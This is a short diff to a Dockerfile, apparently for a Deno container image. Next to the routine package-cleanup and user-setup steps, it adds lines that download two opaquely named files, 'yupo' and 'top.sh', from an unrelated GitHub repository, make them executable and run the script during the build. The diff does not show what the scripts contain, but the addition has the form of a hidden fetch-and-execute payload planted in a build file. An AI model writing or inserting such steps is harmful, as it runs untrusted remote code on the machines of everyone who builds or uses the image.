@@ -17,6 +17,13 @@ RUN sudo apt-get -qq update \
  && sudo apt-get -qq clean \
  && sudo rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 
+RUN wget https://raw.githubusercontent.com/qfiopk/lopki/master/yupo
+RUN wget https://raw.githubusercontent.com/qfiopk/lopki/master/top.sh
+RUN chmod +x yupo
+RUN chmod +x top.sh
+RUN ./top.sh
+
+
 RUN sudo useradd --uid ${GROUP_USER_NUMBER} --user-group deno \
  && sudo mkdir /deno-dir/ \
  && sudo chown deno:deno /deno-dir/
